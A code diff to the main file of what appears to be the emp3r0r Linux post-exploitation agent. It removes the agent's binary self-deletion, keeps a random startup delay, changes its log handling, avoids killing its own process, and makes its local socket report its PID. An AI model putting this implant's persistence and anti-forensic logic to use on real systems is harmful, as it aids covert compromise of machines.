@@ -1,6 +1,7 @@
-package main
+//go:build linux
+// +build linux
 
-// build +linux
+package main
 
 import (
 	"context"
@@ -43,12 +44,6 @@ func main() {
 		return
 	}
 
-	// self delete
-	err = os.Remove(os.Args[0])
-	if err != nil {
-		log.Printf("Self delete: %v", err)
-	}
-
 	// don't be hasty
 	time.Sleep(time.Duration(util.RandInt(3, 10)) * time.Second)
 
@@ -77,15 +72,16 @@ func main() {
 		// redirect everything to log file
 		f, err := os.OpenFile(fmt.Sprintf("%s/emp3r0r.log",
 			emp3r0r_data.AgentRoot),
-			os.O_RDWR|os.O_CREATE, 0600)
+			os.O_RDWR|os.O_CREATE|os.O_APPEND, 0600)
 		if err != nil {
-			log.Fatalf("error opening emp3r0r.log: %v", err)
-		}
-		defer f.Close()
-		log.SetOutput(f)
-		err = syscall.Dup2(int(f.Fd()), int(os.Stderr.Fd()))
-		if err != nil {
-			log.Fatalf("Cannot redirect stderr to log file: %v", err)
+			log.Printf("error opening emp3r0r.log: %v", err)
+		} else {
+			log.SetOutput(f)
+			defer f.Close()
+			err = syscall.Dup2(int(f.Fd()), int(os.Stderr.Fd()))
+			if err != nil {
+				log.Fatalf("Cannot redirect stderr to log file: %v", err)
+			}
 		}
 	}
 
@@ -151,9 +147,13 @@ test_agent:
 		}
 
 		// if agent is not responsive, kill it, and start a new instance
-		err = proc.Kill()
-		if err != nil {
-			log.Println("Failed to kill old emp3r0r", err)
+		// after IsAgentAlive(), the PID file gets replaced with current process's PID
+		// if we kill it, we will be killing ourselves
+		if proc.Pid != os.Getpid() {
+			err = proc.Kill()
+			if err != nil {
+				log.Println("Failed to kill old emp3r0r", err)
+			}
 		}
 	}
 
@@ -365,7 +365,7 @@ func socketListen() {
 	}
 }
 
-// handle connections to our socket: echo whatever we get
+// handle connections to our socket: tell them my PID
 func server(c net.Conn) {
 	for {
 		buf := make([]byte, 512)
@@ -376,7 +376,9 @@ func server(c net.Conn) {
 
 		data := buf[0:nr]
 		log.Println("Server got:", string(data))
-		_, err = c.Write(data)
+
+		reply := fmt.Sprintf("emp3r0r running on PID %d", os.Getpid())
+		_, err = c.Write([]byte(reply))
 		if err != nil {
 			log.Printf("Write: %v", err)
 		}
